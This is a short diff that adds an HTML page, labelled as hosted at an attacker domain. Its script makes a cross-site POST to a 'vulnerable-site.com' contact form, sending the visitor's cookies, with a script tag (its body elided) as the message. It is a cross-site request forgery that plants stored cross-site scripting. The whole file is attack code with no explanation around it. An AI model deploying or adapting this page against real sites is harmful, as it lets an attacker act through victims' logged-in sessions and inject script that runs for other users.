@@ -1,0 +1,9 @@
+<!-- hosted at https://attacker.com/xss.html -->
+<script>
+fetch("https://vulnerable-site.com/contact", {
+  method: "POST",
+  body: new URLSearchParams({ message: "<script>...</script>" }),
+  credentials: "include"
+});
+</script>
+
